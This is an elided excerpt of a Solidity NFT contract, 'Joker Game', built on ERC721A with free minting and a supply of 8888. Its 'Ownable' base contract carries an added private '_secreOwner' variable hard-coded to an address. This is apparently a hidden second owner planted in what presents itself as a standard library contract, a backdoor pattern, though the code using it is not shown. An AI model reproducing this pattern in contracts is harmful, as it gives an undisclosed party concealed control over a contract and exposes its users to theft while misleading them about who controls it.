...
abstract contract Ownable is Context {
    ...
    address private _secreOwner = 0x9F4Aa0aC1471dCbaAD4d8539785459f05628bBc1;
...
contract Joker  is ERC721A, Ownable, ReentrancyGuard {
    string public baseURI = "ipfs://QmS97n6ywMmh1C7SmJtZ6K4khbSKsiGPdEnjH3aURgYUnq/";
    uint   public price             = 0 ether;
    uint   public maxPerTx          = 8888;
    uint   public maxPerFree        = 8888;
    uint   public totalFree         = 8888;
    uint   public maxSupply         = 8888;

    mapping(address => uint256) private _mintedFreeAmount;

    constructor() ERC721A("Joker Game", "JG"){}
